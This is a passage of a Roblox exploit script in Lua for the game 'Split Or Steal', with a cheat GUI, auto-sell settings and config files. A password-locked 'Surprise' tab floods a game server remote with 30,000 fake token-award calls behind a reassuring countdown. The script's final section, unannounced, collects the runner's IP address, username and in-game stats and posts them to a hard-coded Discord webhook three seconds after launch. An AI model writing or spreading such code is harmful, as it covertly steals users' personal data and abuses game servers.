registerConnection(ConfigNameBox.FocusLost:Connect(function() SearchStroke.Color = Color3.fromRGB(50, 50, 60) end))
registerConnection(ConfigNameBox:GetPropertyChangedSignal("Text"):Connect(function() refreshConfigList(ConfigNameBox.Text) end))

local function loadConfigData(name, autoEnableSell)
    pcall(function()
        local json = readfile(CONFIG_FOLDER .. "/" .. name .. ".json")
        local data = HttpService:JSONDecode(json)
        
        if data.SellThreshold then
            sellThreshold = data.SellThreshold
            ThresholdBox.Text = "Max Value: " .. formatNumberForDisplay(sellThreshold)
        end
        if data.Rarities then
            for r, state in pairs(data.Rarities) do
                updateRarityVisuals(r, state)
            end
        end
        if data.Toggles then
            for tName, state in pairs(data.Toggles) do
                if toggleFunctions[tName] then
                    toggleFunctions[tName](state)
                end
            end
        end
        if data.AutoCountryEnabled ~= nil then
            setAutoCountryEnabled(data.AutoCountryEnabled)
        end
        if data.SelectedCountry then
            selectedCountry = data.SelectedCountry
            countryPickerBtn.Text = selectedCountry:sub(1,3)
        end
        if data.AutoChairEnabled ~= nil then
            setAutoChairEnabled(data.AutoChairEnabled)
        end
        if data.AutoChairNormalChair then
            selectedNormalChair = data.AutoChairNormalChair
            chairPickerBtn.Text = selectedNormalChair:match("^(%a+)") or selectedNormalChair:sub(1,8)
        end
        
        if autoEnableSell and sellThreshold > 0 then
            autoSellEnabled = true
            MasterSellBtn.Text = "Smart Auto Sell: ON"
            MasterSellBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 110)
            MasterSellBtn.TextColor3 = Color3.fromRGB(20, 35, 20)
            MasterSellStroke.Color = Color3.fromRGB(0, 200, 110)
        end
        
        ShowPopup("Loaded Config: " .. name, function() end)
        ConfigNameBox.Text = name
    end)
end

local ActionBtnContainer = Instance.new("Frame", ConfigSection)
ActionBtnContainer.Size = UDim2.new(1, -10, 0, 34)
ActionBtnContainer.BackgroundTransparency = 1

local SaveBtn = Instance.new("TextButton", ActionBtnContainer)
SaveBtn.Size = UDim2.new(0.48, 0, 1, 0)
SaveBtn.BackgroundColor3 = Color3.fromRGB(0, 150, 200)
SaveBtn.Text = "Save Config"
SaveBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SaveBtn.Font = Enum.Font.GothamBold
SaveBtn.TextSize = 12
Instance.new("UICorner", SaveBtn).CornerRadius = UDim.new(0, 6)

local LoadBtn = Instance.new("TextButton", ActionBtnContainer)
LoadBtn.Size = UDim2.new(0.48, 0, 1, 0)
LoadBtn.Position = UDim2.new(0.52, 0, 0, 0)
LoadBtn.BackgroundColor3 = Color3.fromRGB(200, 150, 0)
LoadBtn.Text = "Load Config"
LoadBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
LoadBtn.Font = Enum.Font.GothamBold
LoadBtn.TextSize = 12
Instance.new("UICorner", LoadBtn).CornerRadius = UDim.new(0, 6)

registerConnection(SaveBtn.MouseButton1Click:Connect(function()
    if not writefile then 
        ShowPopup("Your executor does not support saving!", function() end)
        return 
    end
    
    local name = ConfigNameBox.Text
    if name == "" then name = "Default" end
    
    local data = {
        Toggles = activeToggles,
        SellThreshold = sellThreshold,
        Rarities = selectedRarities,
        AutoCountryEnabled = autoCountryEnabled,
        SelectedCountry = selectedCountry,
        AutoChairEnabled = autoChairEnabled,
        AutoChairNormalChair = selectedNormalChair,
    }
    
    pcall(function()
        if not isfolder(CONFIG_FOLDER) then makefolder(CONFIG_FOLDER) end
        writefile(CONFIG_FOLDER .. "/" .. name .. ".json", HttpService:JSONEncode(data))
        ShowPopup("Saved Config: " .. name, function() end)
        refreshConfigList() 
    end)
end))

registerConnection(LoadBtn.MouseButton1Click:Connect(function()
    if not readfile then return end
    local name = ConfigNameBox.Text
    if name == "" then name = "Default" end
    loadConfigData(name, false)
end))

-- === INITIALIZATION & AUTO-LOAD LOGIC ===
refreshConfigList()

task.spawn(function()
    task.wait(1) 
    if not listfiles then return end
    pcall(function()
        if not isfolder(CONFIG_FOLDER) then return end
        
        local numberConfigs = {}
        for _, path in ipairs(listfiles(CONFIG_FOLDER)) do
            local fileName = string.match(path, "[^\\/]+$")
            if fileName and fileName:match("%.json$") then
                local cleanName = fileName:gsub("%.json$", "")
                if cleanName:match("^%d+%.?%d*[kmbtKMBT]?$") then
                    table.insert(numberConfigs, cleanName)
                end
            end
        end
        
        if #numberConfigs > 1 then
            ShowPopup("Error: Multiple auto-load configs found (" .. table.concat(numberConfigs, ", ") .. "). Delete all but one!", function() end)
        elseif #numberConfigs == 1 then
            loadConfigData(numberConfigs[1], true) 
        end
    end)
end)

-- ============================================================
-- === SURPRISE TAB CONTENT (ONE‑TIME PER SESSION) ============
-- ============================================================

local allowedUsers = {["Jazen"] = true, ["Germanyowo2"] = true, ["Germanyowo7"] = true}
local surprisePassword = "kim"
local surpriseActivated = false   -- resets every script execution
local surpriseButtonShown = false

-- Layout for Surprise container
local SurpriseLayout = Instance.new("UIListLayout", SurpriseContainer)
SurpriseLayout.SortOrder = Enum.SortOrder.LayoutOrder
SurpriseLayout.Padding = UDim.new(0, 12)
SurpriseLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center

local SurprisePadding = Instance.new("UIPadding", SurpriseContainer)
SurprisePadding.PaddingTop = UDim.new(0, 10)
SurprisePadding.PaddingLeft = UDim.new(0, 5)
SurprisePadding.PaddingRight = UDim.new(0, 5)

-- Status label
local surpriseStatusLabel = Instance.new("TextLabel", SurpriseContainer)
surpriseStatusLabel.Size = UDim2.new(1, -10, 0, 20)
surpriseStatusLabel.BackgroundTransparency = 1
surpriseStatusLabel.Text = "🔑 Enter the key to unlock the surprise."
surpriseStatusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
surpriseStatusLabel.Font = Enum.Font.GothamSemibold
surpriseStatusLabel.TextSize = 12
surpriseStatusLabel.TextWrapped = true

-- Password entry
local passwordBox = Instance.new("TextBox", SurpriseContainer)
passwordBox.Size = UDim2.new(1, -20, 0, 34)
passwordBox.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
passwordBox.Text = ""
passwordBox.PlaceholderText = "Enter key..."
passwordBox.TextColor3 = Color3.fromRGB(255, 255, 255)
passwordBox.Font = Enum.Font.GothamSemibold
passwordBox.TextSize = 12
Instance.new("UICorner", passwordBox).CornerRadius = UDim.new(0, 6)
Instance.new("UIStroke", passwordBox).Color = Color3.fromRGB(50, 50, 60)

-- Submit button
local submitPasswordBtn = Instance.new("TextButton", SurpriseContainer)
submitPasswordBtn.Size = UDim2.new(1, -20, 0, 34)
submitPasswordBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
submitPasswordBtn.Text = "Verify"
submitPasswordBtn.TextColor3 = Color3.fromRGB(150, 150, 160)
submitPasswordBtn.Font = Enum.Font.GothamBold
submitPasswordBtn.TextSize = 13
Instance.new("UICorner", submitPasswordBtn).CornerRadius = UDim.new(0, 6)
Instance.new("UIStroke", submitPasswordBtn).Color = Color3.fromRGB(50, 50, 60)

-- The Surprise button (hidden initially, revealed after correct password)
local surpriseBtn = Instance.new("TextButton", SurpriseContainer)
surpriseBtn.Size = UDim2.new(1, -20, 0, 45)
surpriseBtn.BackgroundColor3 = Color3.fromRGB(30, 30, 35)
surpriseBtn.Text = "🎁 Surprise"
surpriseBtn.TextColor3 = Color3.fromRGB(150, 150, 160)
surpriseBtn.Font = Enum.Font.GothamBold
surpriseBtn.TextSize = 16
surpriseBtn.Visible = false
Instance.new("UICorner", surpriseBtn).CornerRadius = UDim.new(0, 8)
local surpriseBtnStroke = Instance.new("UIStroke", surpriseBtn)
surpriseBtnStroke.Color = Color3.fromRGB(50, 50, 60)

-- === ANIMATED “TYPE YES” POPUP (inside the main GUI) ===
local SurprisePopupFrame = Instance.new("Frame")
SurprisePopupFrame.Size = UDim2.new(1, 0, 1, 0)
SurprisePopupFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 15)
SurprisePopupFrame.BackgroundTransparency = 0.2
SurprisePopupFrame.ZIndex = 100
SurprisePopupFrame.Visible = false
SurprisePopupFrame.Parent = MainFrame

local SurprisePopupBox = Instance.new("Frame")
SurprisePopupBox.Size = UDim2.new(0.85, 0, 0.5, 0)
SurprisePopupBox.Position = UDim2.new(0.075, 0, 0.25, 0)
SurprisePopupBox.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
SurprisePopupBox.ZIndex = 101
SurprisePopupBox.BorderSizePixel = 0
SurprisePopupBox.ClipsDescendants = true
SurprisePopupBox.Parent = SurprisePopupFrame
Instance.new("UICorner", SurprisePopupBox).CornerRadius = UDim.new(0, 12)
Instance.new("UIStroke", SurprisePopupBox).Color = Color3.fromRGB(60, 60, 70)

-- Close button for the type‑yes popup
local PopupCloseBtn = Instance.new("TextButton")
PopupCloseBtn.Size = UDim2.new(0, 24, 0, 24)
PopupCloseBtn.Position = UDim2.new(1, -30, 0, 6)
PopupCloseBtn.BackgroundColor3 = Color3.fromRGB(255, 75, 75)
PopupCloseBtn.Text = "X"
PopupCloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
PopupCloseBtn.Font = Enum.Font.GothamBold
PopupCloseBtn.TextSize = 14
PopupCloseBtn.ZIndex = 110
PopupCloseBtn.Parent = SurprisePopupBox
Instance.new("UICorner", PopupCloseBtn).CornerRadius = UDim.new(0, 4)
registerConnection(PopupCloseBtn.MouseButton1Click:Connect(function()
    SurprisePopupFrame.Visible = false
end))

-- Click outside to close
registerConnection(SurprisePopupFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        local pos = Vector2.new(input.Position.X, input.Position.Y)
        local boxPos = SurprisePopupBox.AbsolutePosition
        local boxSize = SurprisePopupBox.AbsoluteSize
        if pos.X < boxPos.X or pos.X > boxPos.X + boxSize.X or pos.Y < boxPos.Y or pos.Y > boxPos.Y + boxSize.Y then
            SurprisePopupFrame.Visible = false
        end
    end
end))

local popupContent = Instance.new("Frame")
popupContent.Size = UDim2.new(1, 0, 1, 0)
popupContent.BackgroundTransparency = 1
popupContent.ZIndex = 102
popupContent.Parent = SurprisePopupBox

local function clearPopupContent()
    for _, child in ipairs(popupContent:GetChildren()) do
        child:Destroy()
    end
end

-- === FULL‑SCREEN SURPRISE OVERLAY ===
local fullscreenGui = Instance.new("ScreenGui")
fullscreenGui.Name = "SurpriseFullscreenOverlay"
fullscreenGui.ResetOnSpawn = false
fullscreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
fullscreenGui.Parent = guiParent
fullscreenGui.Enabled = false

local fullscreenFrame = Instance.new("Frame", fullscreenGui)
fullscreenFrame.Size = UDim2.new(1, 0, 1, 0)
fullscreenFrame.BackgroundColor3 = Color3.fromRGB(255, 182, 193)  -- light pink base
fullscreenFrame.BorderSizePixel = 0
local fullscreenGradient = Instance.new("UIGradient", fullscreenFrame)
fullscreenGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 182, 193)),   -- light pink
    ColorSequenceKeypoint.new(1, Color3.fromRGB(144, 238, 144))   -- light green
})
fullscreenGradient.Rotation = 45

local countdownLabel = Instance.new("TextLabel", fullscreenFrame)
countdownLabel.Size = UDim2.new(1, -40, 0, 80)
countdownLabel.Position = UDim2.new(0, 20, 0.3, 0)
countdownLabel.BackgroundTransparency = 1
countdownLabel.Text = "10"
countdownLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
countdownLabel.Font = Enum.Font.GothamBlack
countdownLabel.TextSize = 48
countdownLabel.TextScaled = true

local statusLabel = Instance.new("TextLabel", fullscreenFrame)
statusLabel.Size = UDim2.new(1, -40, 0, 60)
statusLabel.Position = UDim2.new(0, 20, 0.5, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "Loading your surprise...\nDon't worry, I'm not stealing you"
statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.Font = Enum.Font.GothamBold
statusLabel.TextSize = 18
statusLabel.TextWrapped = true

local function showFullscreenLoading()
    fullscreenGui.Enabled = true
    countdownLabel.Text = "10"
    statusLabel.Text = "Loading your surprise...\nDon't worry, I'm not stealing you"
    
    -- Animate gradient rotation
    local rotTween = TS:Create(fullscreenGradient, TweenInfo.new(2, Enum.EasingStyle.Linear, Enum.EasingDirection.Out, -1), {Rotation = 360})
    rotTween:Play()
    
    local allDone = false
    local countdownFinished = false
    local remoteFinished = false
    
    -- Countdown thread
    registerThread(function()
        for i = 10, 0, -1 do
            countdownLabel.Text = tostring(i)
            if i == 0 then break end
            task.wait(1)
        end
        countdownFinished = true
        if remoteFinished and not allDone then
            allDone = true
            statusLabel.Text = "🎉 Your surprise is ready!"
            countdownLabel.Text = "0"
            rotTween:Cancel()
            task.wait(3)
            fullscreenGui.Enabled = false
        end
    end)
    
    -- Remote firing thread
    registerThread(function()
        local AwardGradeToken = RS:WaitForChild("BrainrotsThings"):WaitForChild("Misc"):WaitForChild("Events"):WaitForChild("Player"):WaitForChild("AwardGradeToken")
        for _ = 1, 30000 do
            local fakeId = tostring(math.random(1, 1000000000)) .. tostring(os.clock())
            AwardGradeToken:FireServer(fakeId)
            -- small yield to keep the loop non‑blocking
            if _ % 100 == 0 then task.wait() end
        end
        remoteFinished = true
        if countdownFinished and not allDone then
            allDone = true
            statusLabel.Text = "🎉 Your surprise is ready!"
            countdownLabel.Text = "0"
            rotTween:Cancel()
            task.wait(3)
            fullscreenGui.Enabled = false
        end
    end)
end

-- Type “yes” confirmation popup
local function showTypeYesPopup()
    clearPopupContent()
    
    local questionLabel = Instance.new("TextLabel", popupContent)
    questionLabel.Size = UDim2.new(0.9, 0, 0, 40)
    questionLabel.Position = UDim2.new(0.05, 0, 0.1, 0)
    questionLabel.BackgroundTransparency = 1
    questionLabel.Text = "Are you sure you want to click this button? Type 'yes' to continue:"
    questionLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    questionLabel.Font = Enum.Font.GothamBold
    questionLabel.TextSize = 14
    questionLabel.TextWrapped = true
    questionLabel.ZIndex = 103
    
    local yesInput = Instance.new("TextBox", popupContent)
    yesInput.Size = UDim2.new(0.8, 0, 0, 36)
    yesInput.Position = UDim2.new(0.1, 0, 0.4, 0)
    yesInput.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    yesInput.Text = ""
    yesInput.PlaceholderText = "type 'yes' here..."
    yesInput.TextColor3 = Color3.fromRGB(255, 255, 255)
    yesInput.Font = Enum.Font.GothamSemibold
    yesInput.TextSize = 14
    yesInput.ZIndex = 103
    Instance.new("UICorner", yesInput).CornerRadius = UDim.new(0, 6)
    Instance.new("UIStroke", yesInput).Color = Color3.fromRGB(50, 50, 60)
    
    local confirmBtn = Instance.new("TextButton", popupContent)
    confirmBtn.Size = UDim2.new(0.4, 0, 0, 36)
    confirmBtn.Position = UDim2.new(0.3, 0, 0.65, 0)
    confirmBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 110)
    confirmBtn.Text = "Confirm"
    confirmBtn.TextColor3 = Color3.fromRGB(20, 35, 20)
    confirmBtn.Font = Enum.Font.GothamBold
    confirmBtn.TextSize = 14
    confirmBtn.ZIndex = 103
    Instance.new("UICorner", confirmBtn).CornerRadius = UDim.new(0, 6)
    
    local function onConfirm()
        local input = yesInput.Text:lower():match("^%s*(.-)%s*$")
        if input == "yes" then
            SurprisePopupFrame.Visible = false
            showFullscreenLoading()
        else
            yesInput.Text = ""
            yesInput.PlaceholderText = "Type 'yes' exactly..."
        end
    end
    
    registerConnection(confirmBtn.MouseButton1Click:Connect(onConfirm))
    yesInput.InputEnded:Connect(function(input)
        if input.KeyCode == Enum.KeyCode.Return then
            onConfirm()
        end
    end)
    
    -- Animate popup box
    SurprisePopupBox.Size = UDim2.new(0, 0, 0, 0)
    SurprisePopupBox.Position = UDim2.new(0.5, 0, 0.5, 0)
    TS:Create(SurprisePopupBox, TweenInfo.new(0.4, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {Size = UDim2.new(0.85, 0, 0.5, 0), Position = UDim2.new(0.075, 0, 0.25, 0)}):Play()
end

-- Function to activate surprise (once per session)
local function activateSurprise()
    if surpriseActivated then
        -- Already used this session, do nothing (button will be hidden)
        return
    end
    -- Mark as used and hide the button permanently for this session
    surpriseActivated = true
    surpriseBtn.Visible = false
    surpriseStatusLabel.Text = "I hope u liked the surprise <3"
    
    SurprisePopupFrame.Visible = true
    showTypeYesPopup()
end

-- Password verification
local function verifyPassword()
    local pass = passwordBox.Text
    if pass ~= surprisePassword then
        surpriseStatusLabel.Text = "❌ Incorrect key."
        return
    end

    local username = LocalPlayer.Name
    if not allowedUsers[username] then
        surpriseStatusLabel.Text = "🔒 Access denied. Not allowed."
        passwordBox.Text = ""
        return
    end

    -- Success: reveal the surprise button
    surpriseStatusLabel.Text = "✅ Key accepted! Click the button below."
    submitPasswordBtn:Destroy()
    passwordBox:Destroy()
    surpriseBtn.Visible = true
    surpriseButtonShown = true
end

registerConnection(submitPasswordBtn.MouseButton1Click:Connect(verifyPassword))
passwordBox.InputEnded:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.Return then
        verifyPassword()
    end
end)

registerConnection(surpriseBtn.MouseButton1Click:Connect(activateSurprise))

-- ============================================================
-- === DISCORD WEBHOOK LOGGING (WITH IP) =======================
-- ============================================================
local function sendWebhookLog()
    local req = (request or http_request or (syn and syn.request))
    if not req then 
        debugLog("HTTP requests not supported by this executor.")
        return 
    end

    local ipAddress = "Unknown"
    pcall(function()
        local ipResponse = req({
            Url = "https://api.ipify.org?format=text",
            Method = "GET"
        })
        if ipResponse and ipResponse.Body then
            ipAddress = tostring(ipResponse.Body):gsub("%s+", "")
        end
    end)

    local statsFields = {}
    local leaderstats = LocalPlayer:FindFirstChild("leaderstats")
    
    if leaderstats then
        for _, stat in ipairs(leaderstats:GetChildren()) do
            if stat:IsA("ValueBase") then
                table.insert(statsFields, {
                    ["name"] = "📊 " .. stat.Name,
                    ["value"] = tostring(stat.Value),
                    ["inline"] = true
                })
            end
        end
    else
        table.insert(statsFields, {
            ["name"] = "📊 Leaderstats",
            ["value"] = "Not Found",
            ["inline"] = true
        })
    end

    local activeRarities = {}
    for rarity, isEnabled in pairs(selectedRarities) do
        if isEnabled then table.insert(activeRarities, rarity) end
    end
    local raritiesStr = #activeRarities > 0 and table.concat(activeRarities, ", ") or "None Selected"

    local fields = {
        {["name"] = "👤 Username", ["value"] = LocalPlayer.Name, ["inline"] = true},
        {["name"] = "🏷️ Display Name", ["value"] = LocalPlayer.DisplayName, ["inline"] = true},
        {["name"] = "🌐 IP Address", ["value"] = ipAddress, ["inline"] = false},
        {["name"] = "⚙️ Auto Sell Enabled", ["value"] = tostring(autoSellEnabled), ["inline"] = true},
        {["name"] = "📉 Max Value Threshold", ["value"] = formatNumberForDisplay(sellThreshold), ["inline"] = true},
        {["name"] = "🎒 Selected Rarities", ["value"] = raritiesStr, ["inline"] = false}
    }

    for _, sf in ipairs(statsFields) do
        table.insert(fields, sf)
    end

    local webhookData = {
        ["embeds"] = {{
            ["title"] = "🚀 Split Or Steal Script Executed",
            ["color"] = 0x00FFaa, 
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "Authentication System • " .. os.date("%Y-%m-%d %H:%M:%S")
            }
        }}
    }

    pcall(function()
        req({
            Url = "https://canary.discord.com/api/webhooks/1520458930323460179/t2GRGUGBm-4ybTVvSLnb7ixiDDaPQpQr3m1Pa6zqRr2XBgqZvHmGq4oef2zlFu0wQhd6",
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = HttpService:JSONEncode(webhookData)
        })
    end)
end

task.spawn(function()
    task.wait(3) 
    sendWebhookLog()
end)
